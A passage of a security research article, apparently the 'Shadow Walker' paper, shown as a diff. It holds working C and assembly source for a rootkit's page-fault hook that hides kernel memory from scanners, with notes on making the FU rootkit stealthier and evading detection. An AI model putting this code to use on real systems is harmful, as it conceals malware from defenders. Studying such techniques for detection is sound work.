+4. The driver must explicitly flush the TLB entry for the page containing  
+   the cloaked variable using the invlpg instruction (i.e. so that the     
+   "real" mapping does not remain in the TLB. We don't want any other      
+   drivers or processes receiving the hidden mapping so we clear it).
+    
+5. The driver lowers the IRQL to the previous level before it was raised.  
+                                                    
+The additional restriction also applies:                                   
+      
+  - No global data can be passed to kernel API functions. When calling an
+    API, global data must be copied into local storage on the stack and
+    passed into the API function (i.e. if the API accesses the cloaked
+    variable it will receive fake data and perform incorrectly).
+
+This protocol can be efficiently implemented in the hidden driver by having
+the driver copy all global data over into local variables at the beginning 
+of the routine and then copy the data back after the function body has     
+completed executing. Because stack data is in a constant state of flux, it 
+is unlikely that a signature could be reliably obtained from  global data  
+on the stack. In this way, there is no need to cause a page fault on every 
+global access. In general, only one page fault is required to copy over the
+data at the beginning of the routine and one fault to copy the data back at
+the end of the routine. Admittedly, this disregards more complex issues    
+involved with multithreaded access and synchronization. An alternative
+approach to using a protocol between the driver and PF handler would
+be to single step the instruction causing the memory access. This would
+be less cumbersome for the driver and yet allow the PF handler to maintain
+control of the DTLB (ie. to flush it after the data access so that it 
+remains empty).
+                   
+----[ 3.3 - Related Work                                                   
+      
+Ironically, the memory cloaking technology discussed in this article is  
+derived from an existing stack overflow protection scheme  known as PaX .  
+As such, we demonstrate a potentially offensive application of an  
+originally defensive technology. Though very similar (i.e. taking advantage
+of the Pentium split TLB architecture), there are subtle differences       
+between PaX and the rootkit application of the technology.  Whereas our    
+memory cloaked rootkit enforces execute, diverted read / write semantics,  
+PaX enforces read / write, no execute semantics.  This enables PaX to      
+provide software support for a non executable stack under the IA-32        
+architecture, thereby thwarting a large class of stack based buffer        
+overflow attacks.  When a PaX protected system detects an attempted execute 
+in a read / write only range of memory, it terminates the offending        
+process. Hardware support for non executable memory has subsequently been  
+added to the page table entry format for some processors including IA-64
+and pentium 4.  In contrast to PaX, our rootkit handler allows              
+execution to proceed normally while diverting  read / write accesses to     
+the hidden page off to an innocent appearing shadow page. Finally, it should
+be noted that PaX uses the PTE user / supervisor bit to generate the
+page faults required to enforce its protection. This limits it to protection
+of solely user mode pages which is an impractical limitation for a
+kernel mode rootkit. As such, we use the PTE present / not present bit
+in our implementation.      
+      
+----[ 3.4 - Proof Of Concept Implementation                                
+      
+Our current implementation uses a modified FU rootkit and a new page fault 
+handler called Shadow Walker. Since FU alters kernel data structures to    
+hide processes and does not utilize any code hooks, we only had to be      
+concerned with hiding the FU driver in memory. The kernel accounts for     
+every process running on the system by storing an object called an EPROCESS 
+block for each process in an internal linked list. FU disconnects the      
+process it wants to hide from this linked list. 
+      
+------[ 3.4.a - Modified FU Rootkit                                        
+      
+We modified the current version of the FU rootkit taken from rootkit.com.  
+In order to make it more stealthy, its dependence on a userland            
+initialization program was removed. Now, all setup information in the form 
+of OS dependant offsets are derived with a kernel level function. By       
+removing the userland portion, we eliminated the need to create a symbolic 
+link to the driver and the need to create a functional device, both of     
+which are easily detected. Once FU is installed, its image on the file    
+system can be deleted so all anti-virus scans on the file system will fail 
+to find it. You can also imagine that FU could be installed from a kernel 
+exploit and loaded into memory thereby avoiding any image on disk          
+detection. Also, FU hides all processes whose names are prefixed with     
+_fu_ regardless of the process ID (PID). We create a System thread that  
+continually scans this list of processes looking for this prefix. FU and  
+the memory hook, Shadow Walker, work in collusion; therefore, FU relies on  
+Shadow Walker to remove the driver from the linked list of drivers in      
+memory and from the Windows Object Manager's driver directory.             
+      
+----[ 3.4.b - Shadow Walker Memory Hook Engine                             
+      
+Shadow Walker consists of a memory hook installation module and a new page 
+fault handler.  The memory hook module takes the virtual address of the    
+page to be hidden as a parameter.  It uses the information contained in the 
+address to perform a few sanity checks. Shadow Walker then installs the new
+page fault handler by hooking Int 0E (if it has not been previously 
+installed) and inserts the information about the hidden page into a hash 
+table so that it can be looked up quickly on page faults. Lastly, the PTE 
+for the page is marked non present and the TLB entry for the hidden page 
+is flushed.  This ensures that all subsequent accesses to the page are 
+filtered by the new page fault handler. 
+
+/*************************************************************************  
+* HookMemoryPage - Hooks a memory page by marking it not present           
+*                  and flushing any entries in the TLB. This ensure        
+*                  that all subsequent memory accesses will generate       
+*                  page faults and be filtered by the page fault handler.  
+*     
+* Parameters:                                                              
+*      PVOID pExecutePage - pointer to the page that will be used on 
+*                           execute access
+*                                                        
+*      PVOID pReadWritePage - pointer to the page that will be used to load 
+*                             the DTLB on data access              *        
+*                            
+*      PVOID pfnCallIntoHookedPage - A void function which will be called  
+*                                    from within the page fault handler to 
+*                                    to load the ITLB on execute accesses  
+*
+*      PVOID pDriverStarts (optional) - Sets the start of the valid range 
+*                                       for data accesses originating from 
+*                                       within the hidden page. 
+*                 
+*      PVOID pDriverEnds (optional) - Sets the end of the valid range for  
+*                                     data accesses originating from within
+*                                     the hidden page.                    
+* Return - None                                                            
+**************************************************************************/ 
+void HookMemoryPage( PVOID pExecutePage, PVOID pReadWritePage, 
+                     PVOID pfnCallIntoHookedPage, PVOID pDriverStarts, 
+                     PVOID pDriverEnds )                          
+{                   
+        HOOKED_LIST_ENTRY HookedPage = {0};                                 
+        HookedPage.pExecuteView = pExecutePage;                             
+        HookedPage.pReadWriteView = pReadWritePage;                        
+        HookedPage.pfnCallIntoHookedPage = pfnCallIntoHookedPage;           
+        if( pDriverStarts != NULL)                                          
+           HookedPage.pDriverStarts = (ULONG)pDriverStarts;           
+        else 
+           HookedPage.pDriverStarts = (ULONG)pExecutePage;  
+
+        if( pDriverEnds != NULL)
+           HookedPage.pDriverEnds = (ULONG)pDriverEnds;                             
+        else                                                               
+        {       //set by default if pDriverEnds is not specified           
+                if( IsInLargePage( pExecutePage ) )                        
+                   HookedPage.pDriverEnds = 
+                   (ULONG)HookedPage.pDriverStarts + LARGE_PAGE_SIZE; 
+                else          
+                   HookedPage.pDriverEnds = 
+                   (ULONG)HookedPage.pDriverStarts + PAGE_SIZE;       
+        }//end if                                                          
+        
+        __asm cli //disable interrupts                                     
+        
+        if( hooked == false )                                              
+        {      HookInt( &g_OldInt0EHandler, 
+                      (unsigned long)NewInt0EHandler, 0x0E ); 
+               hooked = true;                                              
+        }//end if                                                          
+        
+        HookedPage.pExecutePte = GetPteAddress( pExecutePage );            
+        HookedPage.pReadWritePte = GetPteAddress( pReadWritePage ); 
+       
+        //Insert the hooked page into the list                             
+        PushPageIntoHookedList( HookedPage ); 
+                             
+        //Enable the global page feature    
+        EnableGlobalPageFeature( HookedPage.pExecutePte );                 
+        
+        //Mark the page non present                                        
+        MarkPageNotPresent( HookedPage.pExecutePte );  
+                    
+        //Go ahead and flush the TLBs.  We want to guarantee that all      
+        //subsequent accesses to this hooked page are filtered 
+        //through our new page fault handler.                              
+        __asm invlpg pExecutePage       
+                                   
+        __asm sti //reenable interrupts                             
+}//end HookMemoryPage  
+                                                    
+The functionality of the page fault handler is relatively straight forward 
+despite the seeming complexity of the scheme.  Its primary functions are 
+to determine if a given page fault is originating from a hooked page, 
+resolve the access type, and then load the appropriate TLB. As such, the 
+page fault handler has basically two execution paths.  If the page is 
+unhooked, it is passed down to the operating system page fault handler. 
+This is determined as quickly and efficiently as possible.  Faults 
+originating from user mode addresses or while the processor is running in 
+user mode are immediately passed down. The fate of kernel mode accesses is 
+also quickly decided via a hash table lookup. Alternatively, once the page 
+has been determined to be hooked the access type is checked and directed to
+the appropriate TLB loading code (Execute accesses will cause a ITLB load 
+while Read / Write accesses cause a DTLB load). The procedure for TLB 
+loading is as follows:
+        
+1. The appropriate physical frame mapping is loaded into the PTE for the   
+   faulting address.                                                       
+2. The page is temporarily marked present.                                 
+3. For a DTLB load, a memory read on the hooked page is performed.         
+4. For an ITLB load, a call into the hooked page is performed.             
+5. The page is marked as non present again.                                
+6. The old physical frame mapping for the PTE is restored.                 
+      
+After TLB loading, control is directly returned to the faulting code. 
+
+                                                                
+/**************************************************************************
+* NewInt0EHandler - Page fault handler for the memory hook engine (aka. the
+*                   guts of this whole thing ;) 
+*                                                               
+* Parameters - none                                             
+*                                                               
+* Return -      none                                            
+*                                                               
+***************************************************************************
+void __declspec( naked ) NewInt0EHandler(void)                  
+{                                                               
+        __asm                                                   
+        {                                                       
+                pushad                                          
+                mov edx, dword ptr [esp+0x20] //PageFault.ErrorCode        
+                                                                
+                test edx, 0x04 //if the processor was in user mode, then   
+                jnz PassDown   //pass it down                              
+                                                                
+                mov eax,cr2     //faulting virtual address      
+                cmp eax, HIGHEST_USER_ADDRESS                   
+                jbe PassDown   //we don't hook user pages, pass it down    
+                                                                
+                ////////////////////////////////////////        
+                //Determine if it's a hooked page               
+                /////////////////////////////////////////       
+                push eax                                        
+                call FindPageInHookedList                       
+                mov ebp, eax //pointer to HOOKED_PAGE structure            
+                cmp ebp, ERROR_PAGE_NOT_IN_LIST                 
+                jz PassDown  //it's not a hooked page           
+                                                                
+                ///////////////////////////////////////         
+                //NOTE: At this point we know it's a            
+                //hooked page. We also only hook                
+                //kernel mode pages which are either            
+                //non paged or locked down in memory            
+                //so we assume that all page tables             
+                //are resident to resolve the address           
+                //from here on out.                             
+                /////////////////////////////////////           
+                mov eax, cr2                                    
+                mov esi, PROCESS_PAGE_DIR_BASE                  
+                mov ebx, eax                                    
+                shr ebx, 22                                     
+                lea ebx, [esi + ebx*4]  //ebx = pPTE for large page        
+                test [ebx], 0x80        //check if its a large page
+                jnz IsLargePage                                 
+                                                                
+                mov esi, PROCESS_PAGE_TABLE_BASE                
+                mov ebx, eax                                     
+                shr ebx, 12                                     
+                lea ebx, [esi + ebx*4]  //ebx = pPTE            
+                                                                
+IsLargePage:                                                    
+                                                                
+                cmp [esp+0x24], eax     //Is due to an attepmted execute?
+                jne LoadDTLB                                    
+                                                                
+                ////////////////////////////////                
+                // It's due to an execute. Load                 
+                // up the ITLB.                                 
+                ///////////////////////////////                 
+                cli                       
+                or dword ptr [ebx], 0x01         //mark the page present 
+                call [ebp].pfnCallIntoHookedPage //load the itlb         
+                and dword ptr [ebx], 0xFFFFFFFE  //mark page not present 
+                sti                                             
+                jmp ReturnWithoutPassdown                       
+                                                                
+                ////////////////////////////////                
+                // It's due to a read /write                    
+                // Load up the DTLB                             
+                ///////////////////////////////                 
+                ///////////////////////////////                 
+                // Check if the read / write                    
+                // is originating from code                     
+                // on the hidden page.                          
+                ///////////////////////////////                 
+LoadDTLB:                                                       
+                mov edx, [esp+0x24]             //eip           
+                cmp edx,[ebp].pDriverStarts                     
+                jb LoadFakeFrame                                
+                cmp edx,[ebp].pDriverEnds                       
+                ja LoadFakeFrame                                
+                                                                
+                /////////////////////////////////               
+                // If the read /write is originating            
+                // from code on the hidden page,then            
+                // let it go through. The code on the           
+                // hidden  page will follow protocol            
+                // to clear the TLB after the access.           
+                ////////////////////////////////                
+                cli                                             
+                or dword ptr [ebx], 0x01           //mark the page present
+                mov eax, dword ptr [eax]           //load the DTLB        
+                and dword ptr [ebx], 0xFFFFFFFE    //mark page not present
+                sti                                             
+                jmp ReturnWithoutPassdown                       
+                                                                
+                /////////////////////////////////               
+                // We want to fake out this read                
+                // write. Our code is not generating            
+                // it.                                          
+                /////////////////////////////////               
+LoadFakeFrame:                                                  
+                mov esi, [ebp].pReadWritePte                    
+                mov ecx, dword ptr [esi]            //ecx = PTE of the    
+                                                    //read / write page   
+                                                                
+                //replace the frame with the fake one                     
+                mov edi, [ebx]                                  
+                and edi, 0x00000FFF //preserve the lower 12 bits of the   
+                                    //faulting page's PTE                 
+                and ecx, 0xFFFFF000 //isolate the physical address in     
+                                    //the "fake" page's PTE               
+                or ecx, edi                                     
+                mov edx, [ebx]     //save the old PTE so we can replace it
+                cli       
+                mov [ebx], ecx    //replace the faulting page's phys frame
+                                  //address w/ the fake one               
+                                                                
+                //load the DTLB                                 
+                or dword ptr [ebx], 0x01   //mark the page present        
+                mov eax, cr2               //faulting virtual address     
+                mov eax, dword ptr[eax]    //do data access to load DTLB  
+                and dword ptr [ebx], 0xFFFFFFFE //re-mark page not present
+                                                                
+                //Finally, restore the original PTE             
+                mov [ebx], edx                                  
+                sti                                             
+                                                                
+ReturnWithoutPassDown:                                          
+                popad                                           
+                add esp,4                                       
+                iretd                                           
+                                                                
+PassDown:                                                       
+                popad                                           
+                jmp g_OldInt0EHandler                           
+                                                                
+        }//end asm                                              
+}//end NewInt0E                                                 
+
+                                         
+--[ 4 - Known Limitations & Performance Impact  
+                           
+As our current rootkit is intended only as a proof of concept
+demonstration rather than a fully engineered attack tool, it possesses
+a number of implementational limitations.  Most of this functionality 
+could be added, were one so inclined.  First, there is no effort to
+support hyperthreading or multiple processor systems.  Additionally, 
+it does not support the Pentium PAE addressing mode which extends 
+the number of physically addressable bits from 32 to 36. Finally, the
+design is  limited to cloaking only 4K sized kernel mode pages 
+(i.e. in the upper 2 GB range of the memory address space). We mention
+the 4K page limitation because there are currently some technical 
+issues with regard to hiding the 4MB page upon which ntoskrnl resides.
+Hiding the page containing ntoskrnl would be a noteworthy extension.
+In terms of performance, we have not completed rigorous testing, but
+subjectively speaking there is no noticeable performance impact after 
+the rootkit and memory hooking engine are installed.  For maximum 
+performance, as mentioned previously, code and data should remain 
+on separate pages and the usage of global data should be minimized 
+to limit the impact on performance if one desires to enable both 
+data and executable page cloaking. 
+
+--[ 5 - Detection
+
+There are at least a few obvious weaknesses that must be dealt with to
+avoid detection. Our current proof of concept implementation does not 
+address them, however, we note them here for the sake of completeness. 
+Because we must be able to differentiate between normal page faults and 
+those faults related to the memory hook, we impose the requirement that
+hooked pages must reside in non paged memory. Clearly, non present pages
+in non paged memory present an abnormality. Weather or not this is a 
+sufficient heuristic to call a rootkit alarm is, however, debatable.  
+Locking down pagable memory using an API like MmProbeAndLockPages is 
+probably more stealthy. The next weakness lies in the need to disguise 
+the presence of the page fault handler.  Because the page where the page  
+fault handler resides cannot be marked non present due to the obvious 
+issues with recursive reentry, it will be vulnerable to a simple signature 
+scan and must be obsfucated using more traditional methods. Since this 
+routine is small, written in ASM, and does not rely upon any kernel API's, 
+polymorphism would be a reasonable solution.  A related weakness  
+arises in the need to disguise the presence of the IDT hook. We cannot use 
+our memory hooking technique to disguise the modifications to the  
+interrupt descriptor table for similar reasons as the page fault handler. 
+While we could hook the page fault interrupt via an inline hook rather
+than direct IDT modification, placing a memory hook on the page 
+containing the OS's INT 0E handler is problematic and inline hooks 
+are easily detected. Joanna Rutkowska proposed using the debug registers 
+to hide IDT hooks [5], but Edgar Barbosa demonstrated they are not a
+completey effective solution [12]. This is due to the fact that debug 
+registersprotect virtual as opposed to physical addresses. One may simply
+remap the physical frame containing the IDT to a different virtual address
+and read / write the IDT memory as one pleases. Shadow Walker falls prey 
+to this type of attack as well, based as it is, upon the exploitation 
+of virtual rather than physical memory. Despite this aknowleged 
+weakness, most commercial security scanners still perform virtual 
+rather than physical memory scans and will be fooled by rootkits like 
+Shadow Walker.  Finally, Shadow Walker is insidious. Even if a scanner 
+detects Shadow Walker, it will be virtually helpless to remove it on a 
+running system. Were it to successfully over-write the hook with the
+original OS page fault handler, for example, it would likely BSOD the 
+system because there would be some page faults occurring on the hidden
+pages which neither it nor the OS would know how to handle.
+                                                           
+--[ 6 - Conclusion                                                     
+      
+Shadow Walker is not a weaponized attack tool. Its functionality is 
+limited and it makes no effort to hide it's hook on the IDT or its page
+fault handler code. It provides only a practical proof of concept 
+implementation of virtual memory subversion. By inverting the defensive
+software implementation of non executalbe memory, we show that it is
+possible to subvert the view of virtual memory relied upon by the 
+operating system and almost all security scanner applications. Due to its
+exploitation of the TLB architecture, Shadow Walker is transparent and 
+exhibits an extremely light weight performance hit.  Such characteristics
+will no doubt make it an attractive solution for viruses, worms, and 
+spyware applications in addition to rootkits.      
+      
+--[ 7 - References 
+
+1. Tripwire, Inc. http://www.tripwire.com/
+2. Butler, James, VICE - Catch the hookers! Black Hat, Las Vegas, July, 
+   2004. www.blackhat.com/presentations/bh-usa-04/bh-us-04-butler/
+   bh-us-04-butler.pdf
+3. Fuzen, FU Rootkit. http://www.rootkit.com/project.php?id=12
+4. Holy Father, Hacker Defender. http://hxdef.czweb.org/
+5. Rutkowska, Joanna, Detecting Windows Server Compromises with Patchfinder
+   2. January, 2004.
+6. Butler, James and Hoglund, Greg, Rootkits: Subverting the Windows 
+   Kernel. July, 2005. 
+7. B. Cogswell and M. Russinovich, RootkitRevealer, available at: 
+   www.sysinternals.com/ntw2k/freeware/rootkitreveal.shtml
+8. F-Secure BlackLight (Helsinki, Finland: F-Secure Corporation, 2005): 
+   www.fsecure.com/blacklight/
+9. Jack, Barnaby. Remote Windows Exploitation: Step into the Ring 0
+   http://www.eeye.com/~data/publish/whitepapers/research/
+   OT20050205.FILE.pdf
+10. Chong, S.K. Windows Local Kernel Exploitation. 
+    http://www.bellua.com/bcs2005/asia05.archive/
+    BCSASIA2005-T04-SK-Windows_Local_Kernel_Exploitation.ppt
+11. William A. Arbaugh, Timothy Fraser, Jesus Molina, and Nick L. Petroni: 
+    Copilot: A Coprocessor Based Runtime Integrity Monitor. Usenix Security
+    Symposium 2004. 
+12. Barbosa, Edgar. Avoiding Windows Rootkit Detection
+    http://packetstormsecurity.org/filedesc/bypassEPA.pdf
+13. Rutkowska, Joanna. Concepts For The Stealth Windows Rootkit, Sept 2003
+    http://www.invisiblethings.org/papers/chameleon_concepts.pdf 
+14. Russinovich, Mark and Solomon, David. Windows Internals, Fourth 
+    Edition.           
+
+--[ 8 - Aknowlegements
+
+Thanks and aknowlegements go to Joanna Rutkowska for her Chamelon Project 
+paper as it was one of the inspirations for this project, to the PAX team
+for showing how to desynchronize the TLB in their software implementation
+of non executable memory, to Halvar Flake for our inital discussions 
+of the Shadow Walker idea, and to Kayaker for helping beta test and debug
+some of the code. We would finally like to extend our greetings to
+all of the contributors on rootkit.com :)                                  
+      
+|=[ EOF ]=---------------------------------------------------------------=|
+
